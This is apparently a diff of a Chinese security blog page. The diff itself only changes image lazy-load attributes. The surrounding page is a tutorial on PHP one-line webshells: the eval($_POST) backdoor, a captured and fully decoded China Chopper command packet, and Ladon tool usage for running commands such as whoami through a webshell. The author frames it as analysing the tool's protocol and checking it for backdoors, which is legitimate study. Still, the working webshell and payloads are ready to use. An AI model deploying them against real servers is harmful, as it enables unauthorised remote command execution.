@@ -70,7 +70,7 @@
     https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
     <div class="main-header-box">
         <a class="header-avatar" href="/" title="K8gege">
-            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" class="lazyload" data-src="/../images/avatar.png">
 			<h3 class="K8tilte">K8哥哥</h3>
         </a>
         <div class="branding">
@@ -206,27 +206,27 @@
 <!--?php @eval($_POST[tom])?-->
 <h3 id="连接执行代码">连接执行代码</h3>
 <p>通过Post提交tom参数，可执行PHP代码，如tom=phpinfo();<br>
-<img alt="在这里插入图片描述" data-original="https://img-blog.csdnimg.cn/20210203233608962.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2s4Z2VnZQ==,size_16,color_FFFFFF,t_70">当然也可以简单粗暴的执行cmd命令，如tom=system(whoami);<br>
-<img alt="在这里插入图片描述" data-original="https://img-blog.csdnimg.cn/20210203233848425.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2s4Z2VnZQ==,size_16,color_FFFFFF,t_70">但是这样过于明显，会直接暴露我们执行的命令，所以最好做个加密</p>
+<img alt="在这里插入图片描述" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210203233608962.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2s4Z2VnZQ==,size_16,color_FFFFFF,t_70">当然也可以简单粗暴的执行cmd命令，如tom=system(whoami);<br>
+<img alt="在这里插入图片描述" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210203233848425.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2s4Z2VnZQ==,size_16,color_FFFFFF,t_70">但是这样过于明显，会直接暴露我们执行的命令，所以最好做个加密</p>
 <h3 id="菜刀一句话抓包">菜刀一句话抓包</h3>
 <p>使用菜刀原版或K8飞刀的菜刀模式连接PHP一句话执行命令<br>
-<img alt="在这里插入图片描述" data-original="https://img-blog.csdnimg.cn/20210203233213599.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2s4Z2VnZQ==,size_16,color_FFFFFF,t_70"><br>
+<img alt="在这里插入图片描述" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210203233213599.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2s4Z2VnZQ==,size_16,color_FFFFFF,t_70"><br>
 K8飞刀的菜刀选项连接PHP一句话，抓包内容如下：</p>
 <p>tom=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D&amp;z1=Y21k&amp;z2=Y2QgL2QgIkM6XHBocFN0dWR5XFBIUFR1dG9yaWFsXFdXVyImd2hvYW1pJmVjaG8gW1NdJmNkJmVjaG8gW0Vd</p>
 <p>可以看到提交的包使用了URL编码和Base64编码，想知道菜刀如何通讯执行CMD命令或者说有无后门，我们就得将其解密。几年前我曾发过抓过狗菜刀的后门，和此文章同理。</p>
 <h3 id="验证数据包">验证数据包</h3>
 <p>K8飞刀-HackIE模块可测试提交抓到的包，看其是否能正常工作<br>
-<img alt="在这里插入图片描述" data-original="https://img-blog.csdnimg.cn/20210203233347275.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2s4Z2VnZQ==,size_16,color_FFFFFF,t_70"></p>
+<img alt="在这里插入图片描述" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210203233347275.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2s4Z2VnZQ==,size_16,color_FFFFFF,t_70"></p>
 <h3 id="URL编码解密">URL编码解密</h3>
 <p>打开K8飞刀–编码模块(第3个图标)–粘贴抓包数据–复制需要解密的内容–右键编码转换–URL编码–URL编码解密<br>
-<img alt="在这里插入图片描述" data-original="https://img-blog.csdnimg.cn/20210203231109281.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2s4Z2VnZQ==,size_16,color_FFFFFF,t_70"></p>
+<img alt="在这里插入图片描述" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210203231109281.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2s4Z2VnZQ==,size_16,color_FFFFFF,t_70"></p>
 <h3 id="Base64编码解密z1">Base64编码解密z1</h3>
 <p>K8飞刀–右键选中Z1后面内容—编码转换–Base64编码–Base64编码解密<br>
-<img alt="在这里插入图片描述" data-original="https://img-blog.csdnimg.cn/20210203231139358.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2s4Z2VnZQ==,size_16,color_FFFFFF,t_70"></p>
+<img alt="在这里插入图片描述" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210203231139358.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2s4Z2VnZQ==,size_16,color_FFFFFF,t_70"></p>
 <h3 id="Base64编码解密z2">Base64编码解密z2</h3>
-<p><img alt="在这里插入图片描述" data-original="https://img-blog.csdnimg.cn/20210203231223315.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2s4Z2VnZQ==,size_16,color_FFFFFF,t_70"></p>
+<p><img alt="在这里插入图片描述" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210203231223315.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2s4Z2VnZQ==,size_16,color_FFFFFF,t_70"></p>
 <h3 id="明文结果">明文结果</h3>
-<p><img alt="在这里插入图片描述" data-original="https://img-blog.csdnimg.cn/20210203231245828.PNG">完全解密后，我们发现整段代码执行命令参数在z2，执行cmd的post包直接替换z2参数中的whoami再转成base64编码即可实现菜刀连接PHP一句话执行CMD的功能。</p>
+<p><img alt="在这里插入图片描述" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210203231245828.PNG">完全解密后，我们发现整段代码执行命令参数在z2，执行cmd的post包直接替换z2参数中的whoami再转成base64编码即可实现菜刀连接PHP一句话执行CMD的功能。</p>
 <p>tom=@eval(base64_decode($_POST[z0]));&amp;z0=@ini_set(“display_errors”,“0”);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(“-&gt;|”);;$p=base64_decode($_POST[“z1”]);$s=base64_decode($_POST[“z2”]);$d=dirname($_SERVER[“SCRIPT_FILENAME”]);$c=substr($d,0,1)==“/”?“-c "{$s}"”:“/c "{$s}"”;$r=“{$p} {$c}”;@system($r." 2&gt;&amp;1",$ret);print ($ret!=0)?"<br>
 ret={$ret}<br>
 “:”“;;echo(”|&lt;-");die();&amp;z1=Y21k&amp;z2=cd /d “C:\phpStudy\PHPTutorial\WWW”&amp;whoami&amp;echo [S]&amp;cd&amp;echo [E]</p>
@@ -235,7 +235,7 @@ ret={$ret}<br>
 <p>PS: C#版代码可参考K8fly</p>
 <h3 id="LadonGo连接">LadonGo连接</h3>
 <p>Ladon phpshell <a target="_blank" rel="noopener" href="http://192.168.1.8/1.php">http://192.168.1.8/1.php</a> k8 whoami<br>
-<img alt="在这里插入图片描述" data-original="https://img-blog.csdnimg.cn/20210203231308144.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2s4Z2VnZQ==,size_16,color_FFFFFF,t_70"></p>
+<img alt="在这里插入图片描述" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210203231308144.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2s4Z2VnZQ==,size_16,color_FFFFFF,t_70"></p>
 <h3 id="Ladon连接">Ladon连接</h3>
 <p>062 WebShell远程执行命令（非交互式）</p>
 <p>Usage：Ladon WebShell ScriptType ShellType url pwd cmd<br>
@@ -250,7 +250,7 @@ Example: Ladon WebShell php ua <a target="_blank" rel="noopener" href="http://19
     
     <div class="reward" ontouchstart="">
     <div class="reward-wrap">
-	<img height="180" width="180" data-original="../images/k8join2.png">
+	<img height="180" width="180" class="lazyload" data-src="../images/k8join2.png">
 
     </div>
     <p class="reward-tip">
